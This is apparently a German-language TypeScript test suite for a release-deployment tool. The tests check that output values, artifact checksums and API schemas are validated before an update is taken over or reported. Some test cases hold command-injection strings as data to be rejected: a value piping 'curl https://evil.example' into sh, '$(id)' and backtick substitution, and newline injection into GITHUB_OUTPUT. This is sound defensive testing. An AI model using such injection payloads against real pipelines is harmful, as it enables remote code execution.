    assert.equal(ausgabeZeile('auftrag', ''), 'auftrag=');
    assert.equal(ausgabeZeile('archiv', 'C:\\Temp\\release\\clenaris-0123456789ab.tar.gz'), 'archiv=C:\\Temp\\release\\clenaris-0123456789ab.tar.gz');
    // Was der Workflow wirklich schreibt (relatives `--verzeichnis release`),
    // und ein Windows-TEMP mit 8.3-Kurznamen: Tilde in der Mitte ist erlaubt.
    assert.equal(ausgabeZeile('archiv', 'release/clenaris-0123456789ab.tar.gz'), 'archiv=release/clenaris-0123456789ab.tar.gz');
    assert.ok(ausgabeZeile('archiv', 'C:\\Users\\JAVADQ~1\\AppData\\Local\\Temp\\clenaris-0123456789ab.tar.gz'));
    assert.equal(ausgabeZeile('ergebnis', 'ROLLED_BACK'), 'ergebnis=ROLLED_BACK');
    for (const [name, wert] of [
      ['archiv', '/tmp/a.tar.gz\narchiv=/tmp/fremd.tar.gz'],
      ['sha256', `${'a'.repeat(64)}\r`],
      ['modus', 'neu\n'],
      ['auftrag', 'x\ny'],
    ] as const) {
      assert.throws(() => ausgabeZeile(name, wert), /Zeilenumbruch/, name);
    }
    for (const [name, wert] of [
      ['archiv', "/tmp/a'; curl https://evil.example | sh; '"],
      ['archiv', '/tmp/$(id).tar.gz'],
      ['archiv', '/tmp/`id`.tar.gz'],
      // Seit 2026-10-01: ein Leerzeichen trennte ohne Anführungszeichen zwei
      // Wörter; ein führendes `-` läsen scp und tar als Option, ein führendes
      // `~` ersetzte die Shell durch das Heimatverzeichnis.
      ['archiv', '/tmp/mit leerzeichen/clenaris-0123456789ab.tar.gz'],
      ['archiv', 'C:\\Users\\Javad Qasemi\\AppData\\Local\\Temp\\clenaris-0123456789ab.tar.gz'],
      ['archiv', '-v.tar.gz'],
      ['archiv', '~/release/clenaris-0123456789ab.tar.gz'],
      ['commit', 'abc'],
      ['modus', 'vielleicht'],
      ['ergebnis', 'ERFOLG'],
      ['url', 'https://evil.example/beispiel/clenaris/actions/runs/1'],
      ['sha256', 'A'.repeat(64)],
      ['version', ''],
    ] as const) {
      assert.throws(() => ausgabeZeile(name, wert), /nicht die erwartete Form/, `${name}=${wert}`);
    }
    assert.throws(() => ausgabeZeile('befehl', 'x'), /Unbekannte Ausgabe/);
  });

  it('als Prozess: eine Laufliste mit eingeschleustem Zeilenumbruch schreibt nichts nach GITHUB_OUTPUT', () => {
    const dir = mkdtempSync(join(tmpdir(), 'clenaris-ausgabe-'));
    try {
      const datei = join(dir, 'laeufe.json');
      const ausgabe = join(dir, 'github-output.txt');
      writeFileSync(datei, JSON.stringify([lauf(31, { url: 'https://github.com/beispiel/clenaris/actions/runs/31\narchiv=/tmp/fremd.tar.gz' })]));
      const r = spawnSync(process.execPath, [join('node_modules', 'tsx', 'dist', 'cli.mjs'), 'scripts/release-ausfuehrer.ts', 'ci-lauf', '--datei', datei, '--commit', C], {
        env: { ...process.env, GITHUB_OUTPUT: ausgabe },
        encoding: 'utf8',
      });
      assert.equal(r.status, 1, `${r.stdout}\n${r.stderr}`);
      assert.match(r.stderr, /Kein abgeschlossener, grüner Push-Lauf/);
      assert.ok(!existsSync(ausgabe) || readFileSync(ausgabe, 'utf8') === '', 'GITHUB_OUTPUT wurde beschrieben');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('Ausgangscode der Aktivierung: nur 0 ist Erfolg, nur 20 ein Rücksprung, alles andere ein Scheitern', () => {
    assert.deepEqual(aktivierungDeuten('0'), { aktivierung: 'AKTIV', ergebnis: 'SUCCEEDED' });
    assert.deepEqual(aktivierungDeuten('20'), { aktivierung: 'ZURUECK', ergebnis: 'ROLLED_BACK' });
    assert.deepEqual(aktivierungDeuten('10'), { aktivierung: 'NICHT_UMGESCHALTET', ergebnis: 'FAILED' });
    assert.deepEqual(aktivierungDeuten('11'), { aktivierung: 'GESPERRT', ergebnis: 'FAILED' });
    assert.deepEqual(aktivierungDeuten('30'), { aktivierung: 'UNKLAR', ergebnis: 'FAILED' });
    assert.deepEqual(aktivierungDeuten('255'), { aktivierung: 'NICHT_VERBUNDEN', ergebnis: 'FAILED' });
    for (const code of ['', undefined, ' ', '1', '00', 'abc']) {
      assert.deepEqual(aktivierungDeuten(code), { aktivierung: 'UNKLAR', ergebnis: 'FAILED' }, String(code));
    }
  });

  it('plan: eigene Ausführung vor fremder vor neuem Auftrag; Hindernisse werden genannt, nie übergangen', () => {
    const a = (id: string, ueber: Partial<Auftrag> = {}): Auftrag => ({
      auftragId: id,
      status: 'SCHEDULED',
      zielVersion: '9.0.0',
      vonVersion: '1.0.0',
      commit: 'a'.repeat(40),
      artefaktSha256: 'b'.repeat(64),
      ausfuehrungsSchluessel: null,
      hindernis: null,
      ...ueber,
    });
    const lage = (auftraege: Auftrag[], inAusfuehrung: Lage['inAusfuehrung'] = []): Lage => ({
      umgebung: 'test',
      laufend: { version: '1.0.0', commit: 'c'.repeat(40), buildId: 'bau', belegt: true },
      auftraege,
      inAusfuehrung,
    });
    const eigen = { ...a('ceigen0001', { status: 'DEPLOYING', ausfuehrungsSchluessel: 'github-actions-lauf-1001' }), ausfuehrer: 'github-actions/production', seit: '2026-09-30T10:00:00.000Z' };

    const fortsetzen = planen(lage([a('cneu000001')], [eigen]), 'github-actions-lauf-1001');
    assert.equal(fortsetzen.modus, 'fortsetzen');
    assert.equal(fortsetzen.auftrag?.auftragId, 'ceigen0001');
    const fremd = planen(lage([a('cneu000001')], [eigen]), 'github-actions-lauf-2002');
    assert.equal(fremd.modus, 'nichts');
    assert.match(fremd.hinweise.join('\n'), /github-actions\/production/);

    const neu = planen(lage([a('crot000001', { hindernis: 'Die Prüfstufe ist nicht bestanden (FAILED).' }), a('cneu000001')]), 'github-actions-lauf-3003');
    assert.equal(neu.modus, 'neu');
    assert.equal(neu.auftrag?.auftragId, 'cneu000001');
    assert.match(neu.hinweise.join('\n'), /Übersprungen .*crot000001.*Prüfstufe/);

    const nichts = planen(lage([a('crot000001', { hindernis: 'Die laufende Instanz kann ihren Stand nicht belegen.' })]), 'github-actions-lauf-3003');
    assert.equal(nichts.modus, 'nichts');
    assert.equal(nichts.auftrag, null);
  });

  it('abholen misst Archiv, Prüfsummendatei und Beilage gegen Auftrag und CI-Lauf', async () => {
    const dir = artefaktVerzeichnis('clenaris-messen-');
    try {
      const commit = createHash('sha1').update('messen-rein').digest('hex');
      const name = `clenaris-${commit.slice(0, 12)}`;
      const bytes = Buffer.from('Prüfarchiv, rein');
      const summe = createHash('sha256').update(bytes).digest('hex');
      const ci = { lauf: '777', versuch: '1', ereignis: 'push', ref: 'refs/heads/main', repository: 'beispiel/clenaris' };
      const schreiben = (beilage: unknown, summenzeile = `${summe}  ${name}.tar.gz\n`) => {
        writeFileSync(join(dir, `${name}.tar.gz`), bytes);
        writeFileSync(join(dir, `${name}.tar.gz.sha256`), summenzeile);
        writeFileSync(join(dir, `${name}.json`), JSON.stringify(beilage));
      };
      const e = { commit, zielVersion: '9.9.9', artefaktSha256: summe, ciLauf: '777', ciUrl: 'https://github.com/beispiel/clenaris/actions/runs/777' };

      schreiben(pruefBeilage(bytes, { commit, version: '9.9.9', ci }));
      const gemessen = await artefaktMessen(dir, e);
      assert.equal(gemessen.summe, summe);
      assert.equal(gemessen.beilage.buildId, PRUEF_BUILD_ID);
      // Die Zeilen für GITHUB_OUTPUT kommen geprüft aus der Messung — `abholen`
      // schreibt genau diese, nach der Übernahme.
      assert.deepEqual(gemessen.ausgaben, [`archiv=${join(dir, `${name}.tar.gz`)}`, `sha256=${summe}`, `buildid=${PRUEF_BUILD_ID}`]);
      // Eine Build-ID, die der Vertrag zulässt (1–200 beliebige Zeichen), die
      // Ausgabe aber nicht: abgewiesen, schon bei der Messung.
      schreiben(pruefBeilage(bytes, { commit, version: '9.9.9', ci, buildId: 'bau $(id)' }));
      await assert.rejects(() => artefaktMessen(dir, e), /Ausgabe „buildid".*Nichts übernommen/, 'Build-ID');

      const abgewiesen: [string, Partial<typeof e>, RegExp][] = [
        ['anderer CI-Lauf', { ciLauf: '778', ciUrl: 'https://github.com/beispiel/clenaris/actions/runs/778' }, /CI-Lauf 777/],
        ['andere Zielversion', { zielVersion: '9.9.8' }, /Version 9\.9\.9/],
        ['andere Summe im Release', { artefaktSha256: 'f'.repeat(64) }, /Prüfsumme des Release/],
        ['fremdes Repository', { ciUrl: 'https://github.com/andere/clenaris/actions/runs/777' }, /stammt aus beispiel\/clenaris/],
      ];
      for (const [fall, ueber, grund] of abgewiesen) {
        await assert.rejects(() => artefaktMessen(dir, { ...e, ...ueber }), grund, fall);
      }

      schreiben(pruefBeilage(bytes, { commit, version: '9.9.9', ci: null, auslieferbar: false }));
      await assert.rejects(() => artefaktMessen(dir, e), /Probe/, 'Probe');
      schreiben(pruefBeilage(bytes, { commit, version: '9.9.9', ci: { ...ci, ref: 'refs/heads/feature' } }));
      await assert.rejects(() => artefaktMessen(dir, e), /Probe|main/, 'Zweig');
      const { format: _format, ...ohneFormat } = pruefBeilage(bytes, { commit, version: '9.9.9', ci });
      schreiben({ ...ohneFormat, format: 1 });
      await assert.rejects(() => artefaktMessen(dir, e), /Vertrag/, 'Format 1');
      schreiben(pruefBeilage(bytes, { commit, version: '9.9.9', ci }), `${'0'.repeat(64)}  ${name}.tar.gz\n`);
      await assert.rejects(() => artefaktMessen(dir, e), /\.sha256-Datei/, 'Prüfsummendatei');
      schreiben(pruefBeilage(bytes, { commit, version: '9.9.9', ci }), `${summe}  clenaris-anderes.tar.gz\n`);
      await assert.rejects(() => artefaktMessen(dir, e), /anderen Datei/, 'Prüfsummendatei einer anderen Datei');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  /**
   * Die Reihenfolge in `abholen` als Prozess — gegen eine Attrappe der
   * Schnittstelle auf 127.0.0.1, ohne Anwendungsserver.
   *
   * Gegen den Stand vor 2026-09-30 (Befund der Gegenprüfung) scheitert der
   * Fall: Dort kam die Übernahme (POST) vor der Prüfung der Ausgaben. Die
   * Attrappe zählte eine Übernahme, das Werkzeug endete danach mit Ausgang 1,
   * und in einer echten Anwendung stünde der Auftrag in DEPLOYING, bis der
   * stündliche Lauf ihn zwei Stunden später als FAILED schlösse.
   *
   * Der gelungene Lauf vorneweg ist die Gegenprobe: Er zeigt, dass die
   * Attrappe eine Übernahme überhaupt sieht. Ohne ihn wäre „keine Übernahme"
   * auch dann grün, wenn die Attrappe nie gefragt würde.
   *
   * Seit 2026-10-01 gehört das Leerzeichen im Pfad dazu (Gegenprüfung
   * 2026-09-30): Bis dahin liess das Muster es zu, obwohl der Kommentar
   * versprach, der Pfad passe wörtlich in eine Shell-Zeile. Gegen jenen Stand
   * scheitert der dritte Fall — Ausgang 0, eine Übernahme, eine Zeile in
   * GITHUB_OUTPUT.
   */
  it('abholen prüft die Ausgaben vor der Übernahme: eine Klammer im Pfad oder fremde Zeichen in der Build-ID übernehmen nichts und schreiben nichts — ebenso ein Leerzeichen im Pfad', async () => {
    const commit = createHash('sha1').update('abholen-reihenfolge').digest('hex');
    const name = `clenaris-${commit.slice(0, 12)}`;
    const bytes = Buffer.from('Prüfarchiv, Reihenfolge');
    const summe = createHash('sha256').update(bytes).digest('hex');
    const ci = { lauf: '778', versuch: '1', ereignis: 'push', ref: 'refs/heads/main', repository: 'beispiel/clenaris' };
    const AUFTRAG = 'creihenfolge01';
    const uebernahmen: { commit?: string; zielVersion?: string }[] = [];

    const attrappe = await attrappeStarten((methode, pfad, rumpf) => {
      if (methode === 'GET' && pfad.startsWith('/api/cron/release-auftraege?')) {
        const lage: Lage = {
          umgebung: 'test',
          laufend: { version: '1.0.0', commit: 'c'.repeat(40), buildId: 'bau', belegt: true },
          auftraege: [
            { auftragId: AUFTRAG, status: 'SCHEDULED', zielVersion: '9.9.9', vonVersion: '1.0.0', commit, artefaktSha256: summe, ausfuehrungsSchluessel: null, hindernis: null },
          ],
          inAusfuehrung: [],
        };
        return { status: 200, daten: lage };
      }
      if (methode === 'POST' && pfad === '/api/cron/release-auftraege/uebernehmen') {
        uebernahmen.push((rumpf ?? {}) as { commit?: string; zielVersion?: string });
        return { status: 200, daten: { wiederholt: false, auftrag: { status: 'DEPLOYING' } } };
      }
      return null;
    });

    const verzeichnisse: string[] = [];
    const artefakt = (praefix: string, beilage: Partial<ArtefaktBeilage> = {}) => {
      const dir = artefaktVerzeichnis(praefix);
      verzeichnisse.push(dir);
      writeFileSync(join(dir, `${name}.tar.gz`), bytes);
      writeFileSync(join(dir, `${name}.tar.gz.sha256`), `${summe}  ${name}.tar.gz\n`);
      writeFileSync(join(dir, `${name}.json`), JSON.stringify(pruefBeilage(bytes, { commit, version: '9.9.9', ci, ...beilage })));
      return dir;
    };
    const abholen = (dir: string) =>
      werkzeugAsynchron(
        ['abholen', '--verzeichnis', dir, '--auftrag', AUFTRAG, '--ci-lauf', '778', '--ci-url', 'https://github.com/beispiel/clenaris/actions/runs/778'],
        {
          CLENARIS_URL: attrappe.basis,
          RELEASE_EXECUTOR_TOKEN: 'attrappe-token',
          RELEASE_EXECUTOR_SIGNING_KEY: 'attrappe-signaturschluessel',
          UMGEBUNG: 'test',
          AUSFUEHRER: 'pruefreihe/rein',
          SCHLUESSEL: 'pruefreihe-reihenfolge-0001',
        },
        join(dir, 'github-output.txt'),
      );

    try {
      const gutesVerzeichnis = artefakt('clenaris-reihenfolge-');
      const gut = await abholen(gutesVerzeichnis);
      assert.equal(gut.status, 0, gut.text);
      assert.equal(uebernahmen.length, 1, 'die Attrappe hat die Übernahme nicht gesehen — die Fälle unten bewiesen nichts');
      assert.equal(uebernahmen[0]!.commit, commit);
      assert.equal(uebernahmen[0]!.zielVersion, '9.9.9');
      assert.equal(gut.ausgabe, [`archiv=${join(gutesVerzeichnis, `${name}.tar.gz`)}`, `sha256=${summe}`, `buildid=${PRUEF_BUILD_ID}`, ''].join('\n'));

      const faelle: [string, string, RegExp][] = [
        ['Klammer im Pfad', artefakt('clenaris-reihenfolge-(klammer)-'), /Ausgabe „archiv"/],
        ['Build-ID mit Leerzeichen und $', artefakt('clenaris-reihenfolge-', { buildId: 'bau $(id)' }), /Ausgabe „buildid"/],
        ['Leerzeichen im Pfad', artefakt('clenaris-reihenfolge mit leerzeichen-'), /Ausgabe „archiv"/],
      ];
      for (const [fall, dir, grund] of faelle) {
        const r = await abholen(dir);
        assert.equal(r.status, 1, `${fall}: ${r.text}`);
        assert.match(r.text, grund, fall);
        assert.match(r.text, /Nichts übernommen/, fall);
        assert.equal(r.ausgabe, '', `${fall}: GITHUB_OUTPUT wurde beschrieben`);
      }
      assert.equal(uebernahmen.length, 1, 'ein Wert, der nicht weitergegeben werden darf, hat trotzdem eine Übernahme ausgelöst');
    } finally {
      await attrappe.schliessen();
      for (const dir of verzeichnisse) rmSync(dir, { recursive: true, force: true });
    }
  });

  /**
   * `melden` als Prozess gegen eine Attrappe — der Ausgangscode ist hier der
   * Vertrag (Gegenprüfung 2026-09-30, Dateikopf von `release-ausfuehrer.ts`).
   *
   * Gegen den Stand bis 2026-09-30 scheitert der zweite Fall: Ein
   * abgewiesenes „erfolgreich" wurde als FAILED festgehalten, und das Werkzeug
   * endete trotzdem mit 0. Die Vorlage des Workflows wertet `ergebnis` nicht
   * aus; nach einer grünen Aktivierung (Code 0) blieb der ganze Lauf grün,
   * während das Update Center FAILED zeigte. Rücksprung und Scheitern enden
   * ebenfalls mit 2, nur ein festgehaltenes SUCCEEDED mit 0, und eine nicht
   * angenommene Meldung mit 1 — ohne Ausgabe, denn festgehalten ist nichts.
   *
   * Die Attrappe weist „erfolgreich" so ab, wie die Anwendung es tut, wenn die
   * antwortende Instanz das Ziel nicht belegt (422 mit Grund); was das
   * Werkzeug danach sendet, zeichnet sie auf.
   */
  it('melden als Prozess: Ausgang 0 nur für ein festgehaltenes SUCCEEDED — ein abgewiesenes „erfolgreich", ein Rücksprung und ein Scheitern enden mit 2, eine nicht angenommene Meldung mit 1', async () => {
    const gesendet: { ergebnis?: string; aktivierung?: string; meldung?: string }[] = [];
    let erfolgBelegt = true;
    let annehmen = true;
    const attrappe = await attrappeStarten((methode, pfad, rumpf) => {
      if (methode !== 'POST' || pfad !== '/api/cron/release-auftraege/ergebnis') return null;
      gesendet.push((rumpf ?? {}) as { ergebnis?: string; aktivierung?: string; meldung?: string });
      if (!annehmen) return { status: 500, fehler: 'Ein unerwarteter Fehler ist aufgetreten.' };
      if (rumpf?.ergebnis === 'SUCCEEDED' && !erfolgBelegt) {
        return {
          status: 422,
          fehler: '„erfolgreich" ist nicht belegt: Die antwortende Instanz belegt Commit cccccccccccc, das Release 9.9.9 ist bbbbbbbbbbbb. Ein Scheitern (FAILED) wird immer angenommen.',
        };
      }
      return { status: 200, daten: { wiederholt: false, auftrag: { status: rumpf?.ergebnis } } };
    });
    const dir = mkdtempSync(join(tmpdir(), 'clenaris-melden-'));
    let laufNummer = 0;
    const melden = (code: string) => {
      gesendet.length = 0;
      laufNummer += 1;
      return werkzeugAsynchron(
        ['melden', '--auftrag', 'cmeldenprobe01', '--aktivierung', code],
        {
          CLENARIS_URL: attrappe.basis,
          RELEASE_EXECUTOR_TOKEN: 'attrappe-token',
          RELEASE_EXECUTOR_SIGNING_KEY: 'attrappe-signaturschluessel',
          SCHLUESSEL: 'pruefreihe-melden-0001',
          AUSFUEHRER_WIEDERHOLUNGEN: '0',
        },
        join(dir, `github-output-${laufNummer}.txt`),
      );
    };

    try {
      // Gegenprobe: belegtes „erfolgreich" — 0, und die Attrappe sah genau eine Meldung.
      const erfolg = await melden('0');
      assert.equal(erfolg.status, 0, erfolg.text);
      assert.equal(erfolg.ausgabe, 'ergebnis=SUCCEEDED\n');
      assert.deepEqual(gesendet.map((g) => g.ergebnis), ['SUCCEEDED']);

      // Aktivierung grün, Instanz belegt das Ziel nicht: FAILED festgehalten, Ausgang 2.
      erfolgBelegt = false;
      const abgewiesen = await melden('0');
      assert.equal(abgewiesen.status, AUSGANG_KEIN_ERFOLG, abgewiesen.text);
      assert.equal(abgewiesen.ausgabe, 'ergebnis=FAILED\n', 'ergebnis muss vor dem roten Ende geschrieben sein');
      assert.match(abgewiesen.text, /Festgehalten ist FAILED statt SUCCEEDED/);
      assert.deepEqual(gesendet.map((g) => g.ergebnis), ['SUCCEEDED', 'FAILED']);
      assert.equal(gesendet[1]!.aktivierung, 'AKTIV');
      assert.match(gesendet[1]!.meldung ?? '', /^SUCCEEDED abgewiesen: .*Commit/);

      // Ein belegter Rücksprung und ein Scheitern der Aktivierung sind
      // festgehalten, aber kein Erfolg.
      for (const [code, ergebnis] of [
        ['20', 'ROLLED_BACK'],
        ['10', 'FAILED'],
        ['', 'FAILED'],
      ] as const) {
        const r = await melden(code);
        assert.equal(r.status, AUSGANG_KEIN_ERFOLG, `Code „${code}": ${r.text}`);
        assert.equal(r.ausgabe, `ergebnis=${ergebnis}\n`, `Code „${code}"`);
      }

      // Die Anwendung nimmt nichts an: Ausgang 1, und GITHUB_OUTPUT bleibt leer —
      // ein Folgeschritt soll kein Ergebnis lesen, das nirgends festgehalten ist.
      annehmen = false;
      const kaputt = await melden('10');
      assert.equal(kaputt.status, 1, kaputt.text);
      assert.match(kaputt.text, /Meldung abgewiesen: HTTP 500/);
      assert.equal(kaputt.ausgabe, '');
    } finally {
      await attrappe.schliessen();
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('release-registrieren: Commit, Prüfsumme und Grösse kommen aus der Beilage; Probe, fremde Version und fremde Migration werden abgewiesen', () => {
    const manifest = releaseManifestSchema.parse({
      version: '9.9.9',
      releasedAt: '2026-09-30T10:00:00Z',
      kind: 'MINOR',
      summary: 'Prüfversion für die Registrierung.',
      migrations: ['20260926100000_versionsverwaltung'],
    });
    const archiv = Buffer.from('Registrierung');
    const beilage = pruefBeilage(archiv, { version: '9.9.9' });

    const zusammen = mitBeilageZusammenfuehren(manifest, beilage);
    assert.ok(zusammen.ok);
    assert.equal(zusammen.manifest.commit, beilage.commit);
    assert.equal(zusammen.manifest.artifactSha256, beilage.archivSha256);
    assert.equal(zusammen.manifest.artifactSizeBytes, archiv.length);

    const faelle: [string, Parameters<typeof mitBeilageZusammenfuehren>, RegExp][] = [
      ['andere Version', [manifest, pruefBeilage(archiv, { version: '9.9.8' })], /Version 9\.9\.9, das Artefakt ist 9\.9\.8/],
      ['Probe', [manifest, pruefBeilage(archiv, { version: '9.9.9', auslieferbar: false, ci: null })], /Probe/],
      ['erfundene Auslieferbarkeit', [manifest, pruefBeilage(archiv, { version: '9.9.9', unsauber: true })], /erfüllt die Regel aber nicht/],
      ['Migration fehlt im Artefakt', [{ ...manifest, migrations: ['20990101000000_gibt_es_nicht'] }, beilage], /20990101000000_gibt_es_nicht/],
      ['widersprechender Commit', [{ ...manifest, commit: 'e'.repeat(40) }, beilage], /Commit/],
      ['widersprechende Prüfsumme', [{ ...manifest, artifactSha256: 'e'.repeat(64) }, beilage], /Prüfsumme/],
    ];
    for (const [fall, args, grund] of faelle) {
      const r = mitBeilageZusammenfuehren(...args);
      assert.ok(!r.ok, fall);
      assert.match(r.gruende.join('\n'), grund, fall);
    }

    // Ein Kürzel ist kein Commit mehr (bis 2026-09-30 genügten 7 Zeichen).
    assert.equal(releaseManifestSchema.safeParse({ ...manifest, commit: beilage.commit.slice(0, 7) }).success, false);
  });

  it('Schemas der Schnittstelle: Übernahme verlangt Commit und Zielversion, das Ergebnis kennt keine laufendeVersion mehr', () => {
    const auftragId = `c${'a'.repeat(24)}`;
    const uebernahme = {
      auftragId,
      umgebung: 'production',
      ausfuehrer: 'github-actions/production',
      ausfuehrungsSchluessel: 'github-actions-lauf-123456',
      artefaktSha256: 'a'.repeat(64),
      commit: 'b'.repeat(40),
      zielVersion: '1.2.0',
      ciNachweis: 'https://github.com/beispiel/clenaris/actions/runs/123456',
    };
    assert.equal(releaseUebernahmeSchema.safeParse(uebernahme).success, true);
    const { commit: _commit, ...ohneCommit } = uebernahme;
    assert.equal(releaseUebernahmeSchema.safeParse(ohneCommit).success, false, 'ohne Commit');
    const { zielVersion: _ziel, ...ohneZiel } = uebernahme;
    assert.equal(releaseUebernahmeSchema.safeParse(ohneZiel).success, false, 'ohne Zielversion');
    assert.equal(releaseUebernahmeSchema.safeParse({ ...uebernahme, commit: 'b'.repeat(12) }).success, false, 'Kürzel');

    const ergebnis = { auftragId, ausfuehrungsSchluessel: 'github-actions-lauf-123456' };
    assert.equal(releaseErgebnisSchema.safeParse({ ...ergebnis, ergebnis: 'SUCCEEDED', aktivierung: 'AKTIV' }).success, true);
    assert.equal(releaseErgebnisSchema.safeParse({ ...ergebnis, ergebnis: 'FAILED', aktivierung: 'UNKLAR' }).success, true);
    assert.equal(releaseErgebnisSchema.safeParse({ ...ergebnis, ergebnis: 'SUCCEEDED', aktivierung: 'AKTIV', laufendeVersion: '1.2.0' }).success, false, 'laufendeVersion');
    assert.equal(releaseErgebnisSchema.safeParse({ ...ergebnis, ergebnis: 'SUCCEEDED', aktivierung: 'ZURUECK' }).success, false, 'Erfolg nach Rücksprung');
    assert.equal(releaseErgebnisSchema.safeParse({ ...ergebnis, ergebnis: 'ROLLED_BACK', aktivierung: 'AKTIV' }).success, false, 'Rücksprung ohne ZURUECK');
    assert.equal(releaseErgebnisSchema.safeParse({ ...ergebnis, ergebnis: 'FAILED' }).success, false, 'ohne Aktivierung');
  });

  it('das Prüfmanifest der Hilfe entspricht dem Vertrag', () => {
    // Schutz für alle Fälle oben: Ändert sich der Vertrag, soll der Aufbau
    // hier scheitern und nicht jeder Fall aus einem anderen Grund.
    assert.equal(pruefManifest().format, 2);
    assert.equal(pruefManifest().version, PAKET_VERSION);
  });
});
